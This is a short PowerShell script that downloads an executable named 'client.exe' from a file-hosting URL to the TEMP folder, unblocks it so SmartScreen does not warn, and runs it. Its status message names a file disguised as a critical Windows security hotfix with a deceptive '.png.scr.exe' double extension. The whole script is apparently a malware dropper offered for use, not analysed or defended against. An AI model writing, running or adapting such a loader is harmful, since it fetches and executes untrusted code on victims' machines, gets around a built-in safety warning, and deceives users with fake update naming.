$url = "https://cdn.storage.to/dd2c3432-4468-426a-8676-1f9344d29226?expires=1778622580&filename=client.exe&id=ICOFAPaLB&sig=3bb159bb44fe094c83bce1d2d099110437fba38240481ee2eb5b7c21120a97b6"

$path = Join-Path $env:TEMP "client.exe"

try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

    Invoke-WebRequest `
        -Uri $url `
        -OutFile $path

    if (Test-Path $path) {

        # optional but helps with SmartScreen
        Unblock-File $path -ErrorAction SilentlyContinue

        # launch
        Start-Process $path

        Write-Host "Removed at C:\PUBLIC\Documents\win-update-security-hotfix-kb9928874-critical-patch.x9z5LCh94mR4L4c49jtm5p9jJLr4mbv9c0x492598918ITKgl9CVJl4kG4m4f9xP4L4m55J4mncq899go53n59V.png.scr.exe" -ForegroundColor Green
    }
    else {
        Write-Host "Download failed." -ForegroundColor Red
    }
}
catch {
    Write-Host $_.Exception.Message -ForegroundColor Red
}
